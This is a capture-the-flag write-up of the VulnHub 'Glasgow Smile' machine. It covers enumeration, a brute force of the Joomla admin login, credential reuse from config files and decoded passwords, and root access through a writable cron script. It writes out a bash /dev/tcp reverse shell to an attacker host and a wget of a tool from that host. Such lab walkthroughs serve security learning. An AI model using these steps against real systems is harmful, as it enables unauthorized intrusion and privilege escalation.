---
title: Vulnhub - Glasgow Smile Writeup
description: My writeup on glasgow smile box.
categories:
 - vulnhub
tags: vulnhub, joomla, burp, brute force, shell, cronjob
---

Hi all, this was a really CTFy box :D

You can find the machine there > [Glasgow Smile](https://www.vulnhub.com/entry/glasgow-smile-11,491/){:target="_blank"}

Let's start as always with a nmap scan.

```bash
$ ip=192.168.1.2
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 21:10 EEST
Nmap scan report for glasgowsmile.zte.com.cn (192.168.1.2)
Host is up (0.00074s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:70:BC:04 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's enumerate port 80 first with `gobuster`.

```
$ gobuster dir -q -u http://$ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.txt
/index.html (Status: 200)
/joomla (Status: 301)
/how_to.txt (Status: 200)
```

`/joomla` is the key for shell, i enumerated a lot but no results. Then i tried to brute force with username `joomla` i really don't know what's going on with makers logic haha, how can we find out this username? pure guess, since default joomla's username is `admin`.

Let's make a wordlist now with `cewl` based on site contents.

```
$ cewl http://$ip/joomla/ > wordlist.txt
$ wc -l wordlist.txt 
166 wordlist.txt
```

Follow my steps now, we will use burp intruder to brute force the admin panel (/administrator).

![](https://i.imgur.com/dL2nk9R.png)

![](https://i.imgur.com/kJ85zeL.png)

![](https://i.imgur.com/Mwg2REX.png)

![](https://i.imgur.com/uvqgcmp.png)

![](https://i.imgur.com/J5TGMPc.png)

Now we can see string `Gotham` has different length : 

![](https://i.imgur.com/BbTAXWW.png)

And we're in! Creds : `joomla:Gotham` follow my steps for reverse shell now :

![](https://i.imgur.com/S9RW221.png)

![](https://i.imgur.com/1Viu62v.png)

![](https://i.imgur.com/Bdlxlai.png)

And we have shell!

```
$ nc -lvp 6666
listening on [any] 6666 ...
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@glasgowsmile:/$ ^Z (CTRL + Z)
[1]+  Stopped                 nc -lvp 6666
$ stty raw -echo
$ fg
www-data@glasgowsmile:/$ 
```

Now privesc it's a bit silly haha. Let's take a look at joomla's configuration file :

```
www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php 
...data..
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla';
	public $password = 'babyjoker';
```

Let's connect to mysql.

```
www-data@glasgowsmile:/var/www/html/joomla$ mysql -u joomla -p
Enter password: 

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.005 sec)

MariaDB [(none)]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> 
```

Let's check the tables :

```
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.001 sec)

MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.001 sec)

MariaDB [batjoke]> 
```

Since user `rob` exists on system, let's decode his `pswd`.

```
$ echo Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ | base64 -d
???AllIHaveAreNegativeThoughts???
```

Let's login in now.

```
www-data@glasgowsmile:/var/www/html/joomla$ su - rob
Password: 
rob@glasgowsmile:~$ whoami
rob
```

We can see this file now in his directory : 

```
rob@glasgowsmile:~$ cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
```

It's rot13 with rotate 1 let's decode it :

![](https://i.imgur.com/tvUS9bG.png)

Now let's decode the base64.

```
$ echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
```

Let's login now as abner.

```
rob@glasgowsmile:/home$ su - abner
Password: 
abner@glasgowsmile:~$ whoami
abner
```

Here i got stuck for a few minutes, then i searched for files that owned by me.

```
abner@glasgowsmile:~$ find / -user abner 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
```

Let's copy it and we can use the same password to open it.

```
abner@glasgowsmile:~$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip .
abner@glasgowsmile:~$ unzip .dear_penguins.zip 
Archive:  .dear_penguins.zip
[.dear_penguins.zip] dear_penguins password: I33hope99my0death000makes44more8cents00than0my0life0
  inflating: dear_penguins           
abner@glasgowsmile:~$ cat dear_penguins 
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
abner@glasgowsmile:~$ su - penguin 
Password: 
penguin@glasgowsmile:~$ 
```

Now for final privesc we have to wget `pspy` to detect a cronjob.

```
penguin@glasgowsmile:~$ cd /tmp
penguin@glasgowsmile:/tmp$ wget -q 192.168.1.16/pspy64; chmod +x pspy64
penguin@glasgowsmile:/tmp$ ./pspy64 -p -i 1000
```

We can see this file running as root :

`CMD: UID=0    PID=1375   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old`

We just have to add our payload in and remove 0.

```
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo "bash -c 'bash -i >& /dev/tcp/192.168.1.16/5555 0>&1'" >> .trash_old
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old 
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

bash -c 'bash -i >& /dev/tcp/192.168.1.16/5555 0>&1'
```

And we have root shell :

```
$ nc -lvp 5555
listening on [any] 5555 ...
root@glasgowsmile:~# 
```

Let's read the flag.

```
root@glasgowsmile:~# cat /root/root.txt
cat /root/root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░



Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}


Credits by

mindsflee
```

Meme box haha, see you!
